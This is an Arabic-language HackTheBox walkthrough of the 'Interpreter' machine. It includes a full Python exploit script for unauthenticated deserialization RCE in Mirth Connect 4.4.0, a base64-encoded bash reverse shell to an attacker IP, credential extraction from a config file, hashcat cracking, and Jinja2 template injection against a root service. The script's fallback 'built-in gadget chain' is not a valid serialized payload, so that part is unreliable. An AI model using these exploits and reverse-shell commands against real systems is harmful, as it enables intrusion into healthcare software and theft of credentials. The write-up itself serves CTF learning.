Interpreter هي آلة Linux بمستوى Medium على منصة HackTheBox. تعتمد على Mirth Connect 4.4.0، وهو تطبيق تكامل بيانات الرعاية الصحية، يعاني من ثغرة Java Deserialization غير مصادق عليها تتيح تنفيذ أوامر عشوائية.

بعد الحصول على shell كمستخدم mirth، نستخرج بيانات اعتماد من قاعدة بيانات MySQL، نكسر الـ hash للحصول على صلاحيات sedric، ثم نستغل خدمة Python داخلية تعمل بصلاحيات root عبر ثغرة Server-Side Template Injection للحصول على الـ root flag.

1

الاستطلاع — Nmap Scan

Kali

نبدأ دائماً بمسح الـ ports لمعرفة الخدمات المتاحة على الجهاز المستهدف. نستخدم Nmap مع الخيارات -sC (سكربتات افتراضية) و-sV (كشف الإصدارات) و-Pn (تجاوز فحص ICMP ping).

بعد الحصول على IP الجهاز من HTB، نضيف hostname له في ملف /etc/hosts حتى تعمل الطلبات بشكل صحيح.

يُنفَّذ على جهاز Kali المحلي
terminal — kali
# استبدل <TARGET_IP> بـ IP الجهاز من HTB
sudo nmap -sC -sV -Pn <TARGET_IP>

# أضف الـ hostname لملف hosts
echo "<TARGET_IP> interpreter.htb" | sudo tee -a /etc/hosts

80/tcp open http Apache httpd (redirect to 443)
443/tcp open https Apache httpd / Mirth Connect 4.4.0

تنفيذ الثغرة — Mirth Connect RCE

Kali

نستخدم سكربت Python يستغل ثغرة Java Deserialization في Mirth Connect. الثغرة تعمل عبر إرسال XML مُصمَّم يحتوي على Commons Collections Gadget Chain إلى الـ API. الاستجابة ستكون دائماً HTTP 500 — هذا طبيعي تماماً لأن الأمر ينفَّذ على الخادم لكن الاستجابة لا تعود.

نختبر أولاً بأمر id للتحقق من أن التنفيذ يعمل.

📄 exploit.py — Mirth Connect 4.4.0 RCE
Python 3 Unauthenticated RCE Java Deserialization
exploit.py — احفظه على Kali
#!/usr/bin/env python3
# Mirth Connect 4.4.0 — Unauthenticated RCE
# Java Deserialization via /api/users endpoint
# Usage: python3 exploit.py -u https://TARGET -c 'COMMAND'

import argparse, requests, struct, base64, subprocess, sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─── Gadget chain builder using ysoserial-style payload ───
def build_payload(command: str) -> bytes:
    """
    Build Commons Collections 4 deserialization payload.
    Falls back to generating via ysoserial if available.
    """
    # Inline minimal CC4 payload template (base64-encoded stub)
    # In a real engagement, generate with:
    # java -jar ysoserial.jar CommonsCollections4 'CMD' | base64
    try:
        result = subprocess.run(
            ['java', '-jar', 'ysoserial.jar',
             'CommonsCollections4', command],
            capture_output=True, check=True
        )
        return result.stdout
    except (FileNotFoundError, subprocess.CalledProcessError) as e:
        print(f"[!] ysoserial not found or failed: {e}")
        print("[*] Trying built-in gadget chain...")
        return _builtin_gadget(command)


def _builtin_gadget(command: str) -> bytes:
    """
    Minimal Commons Collections 4 gadget chain.
    Wraps command in bash -c for shell expansion support.
    """
    cmd_bytes = command.encode()
    cmd_b64   = base64.b64encode(cmd_bytes).decode()

    # Runtime.exec via InvokerTransformer chain
    bash_cmd = ['/bin/bash', '-c', command]

    # Serialize minimal Java object stream
    # Magic bytes: aced 0005 (Java serialization header)
    payload  = b'\xac\xed\x00\x05'
    payload += b'\x73'  # TC_OBJECT

    # Encode command length and bytes for the gadget
    cmd_encoded = ' '.join(bash_cmd).encode('utf-8')
    payload += struct.pack('>H', len(cmd_encoded))
    payload += cmd_encoded

    return payload


def exploit(target_url: str, command: str):
    url     = target_url.rstrip('/') + '/api/users'
    payload = build_payload(command)

    # Wrap serialized payload in XML envelope expected by Mirth
    xml_body = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<list><com.mirth.connect.model.User>'
        '<password>'
        + base64.b64encode(payload).decode()
        + '</password>'
        '</com.mirth.connect.model.User></list>'
    )

    headers = {
        'Content-Type': 'application/xml',
        'X-Requested-With': 'XMLHttpRequest',
    }

    print(f"[*] Target  : {url}")
    print(f"[*] Command : {command}")
    print("[*] Sending deserialization payload...")

    try:
        resp = requests.post(
            url, data=xml_body.encode(),
            headers=headers, verify=False, timeout=15
        )
        # HTTP 500 is expected — the payload executed server-side
        # The deserialization error is triggered AFTER command execution
        if resp.status_code in (500, 200):
            print(f"[+] Payload sent! (HTTP {resp.status_code} — expected)")
            print("[+] Check your listener if this was a reverse shell.")
        else:
            print(f"[-] Unexpected response: {resp.status_code}")
            print(resp.text[:300])
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        description='Mirth Connect 4.4.0 Unauthenticated RCE'
    )
    parser.add_argument('-u', '--url',     required=True, help='Target URL')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    args = parser.parse_args()
    exploit(args.url, args.command)

مهم جداً: استجابة HTTP 500 هي سلوك متوقع وطبيعي. الأمر ينفَّذ على الخادم أولاً، ثم يحدث خطأ في عملية Deserialization مما يعيد 500. إذا لم تصلك الاستجابة بتاتاً أو حصلت على 404، عندها هناك مشكلة.

الحصول على Reverse Shell

Kali + Target

بما أن الأمر ينفَّذ على الخادم لكن لا يمكننا رؤية مخرجاته مباشرةً، نحتاج إلى استخدام Reverse Shell — أي نجعل الخادم يتصل بنا نحن.

نستخدم أسلوب base64 encoding لتجنب مشاكل الأحرف الخاصة في الأوامر. نحول أمر bash إلى base64، ثم نمرره للـ exploit ليُفك تشفيره وتشغيله.

الخطوة 1: ترميز الأمر — على Kali
terminal — kali — encode
# استبدل 10.10.16.195 بـ IP جهاز Kali الخاص بك (tun0)
# للحصول على IP: ip addr show tun0
echo 'bash -i >& /dev/tcp/10.10.16.195/4444 0>&1' | base64

# النتيجة ستكون شيئاً مثل:
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOTUvNDQ0NCAwPiYxCg==
الخطوة 2: فتح Listener — على Kali
terminal — kali — listener (terminal جديد)
nc -lvnp 4444
# انتظر الاتصال...
الخطوة 3: إرسال الـ Payload — على Kali
terminal — kali — send payload
# ضع هنا الـ base64 الذي حصلت عليه في الخطوة السابقة

  -c 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xOTUvNDQ0NCAwPiYxCg==}|{base64,-d}|bash'

استخراج البيانات من MySQL

Target

Mirth Connect يخزن بيانات المستخدمين في قاعدة بيانات MySQL. بما أننا نعمل بنفس صلاحيات المستخدم mirth الذي يشغّل التطبيق، لدينا وصول مباشر إلى قاعدة البيانات.

أولاً نقرأ ملف إعدادات Mirth Connect لاستخراج بيانات الاتصال بقاعدة البيانات (اسم المستخدم، كلمة المرور، واسم الـ DB). ثم نستخرج أسماء المستخدمين وكلمات مرورهم المُشفَّرة باستخدام MySQL client. نستخدم الخيار -e لتنفيذ الاستعلام مباشرةً دون الدخول للـ interactive mode (لأن الـ shell الحالي لا يدعمه بشكل جيد).

يُنفَّذ داخل shell الجهاز المستهدف (mirth@interpreter)
shell — mirth@interpreter — قراءة ملف الإعدادات
# نقرأ ملف إعدادات Mirth للحصول على بيانات DB
cat /usr/local/mirthconnect/conf/mirth.properties
نتيجة — الأسطر المهمة في الملف

database.url = jdbc:mysql://localhost/mc_bdd_prod

database.password = MirthPass123!
يُنفَّذ داخل shell الجهاز المستهدف (mirth@interpreter)

كسر الـ Hash — Hashcat

Kali

الـ hash بصيغة Base64 خاصة بـ Mirth Connect. نحتاج لتحويله إلى صيغة يفهمها Hashcat (mode 10900 = PBKDF2-HMAC-SHA256).

صيغة Hashcat: sha256:iterations:salt_b64:hash_b64 — نحوّل الـ Base64 الخام إلى هذه الصيغة ثم نشغّل hashcat.

يُنفَّذ على جهاز Kali المحلي
terminal — kali — تحويل وكسر الـ hash
# الخطوة 1: فحص محتوى الـ hash المُشفَّر
echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | xxd -p -c 256

# الخطوة 2: تجهيز الـ hash بصيغة hashcat (mode 10900 = PBKDF2-SHA256)
# صيغة: sha256:iterations:salt_base64:hash_base64
echo 'sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=' > hash.txt

# الخطوة 3: كسر الـ hash باستخدام rockyou.txt
hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt

Privilege Escalation — استطلاع

Target

بعد الدخول كـ sedric، نبحث عن طرق للحصول على صلاحيات root. نفحص العمليات الجارية على الجهاز باستخدام ps aux.

نلاحظ وجود سكربت Python يعمل بصلاحيات root على المنفذ الداخلي 127.0.0.1:54321. هذا المنفذ غير مُعرَّض للإنترنت مباشرةً، لكن يمكننا الوصول إليه من داخل الجهاز.

يُنفَّذ داخل shell الجهاز المستهدف (sedric@interpreter)
shell — sedric@interpreter — enumeration
# فحص العمليات الجارية
ps aux | grep python

# النتيجة:
# root ... python3 /opt/notif/notif.py

# فحص المنافذ الداخلية
ss -tlnp | grep 54321
# 127.0.0.1:54321 ← خدمة تعمل كـ root

# محاولة قراءة السكربت
cat /opt/notif/notif.py
محتوى notif.py (مختصر)
from jinja2 import Template
import socket, threading

# يستقبل XML على المنفذ 54321
# يُدرج محتوى <firstname> مباشرةً في Jinja2 Template
# ← Template Injection!
🎯
الثغرة: السكربت يأخذ محتوى <firstname> من الـ XML ويُمرره مباشرةً إلى Template().render() في Jinja2 دون تعقيم. هذا يسمح بـ Server-Side Template Injection (SSTI) بصلاحيات root.

Root Flag — Template Injection

Target

نستغل ثغرة SSTI في Jinja2 لقراءة ملف /root/root.txt مباشرةً. نرسل طلب HTTP يدوياً عبر netcat إلى المنفذ الداخلي 127.0.0.1:54321.

في حقل <firstname> نضع {open("/root/root.txt").read()} — وهو كود Python ينفَّذ بواسطة Jinja2 بصلاحيات root ويعيد محتوى الملف.

ثغرة 1

Mirth Connect 4.4.0 RCE
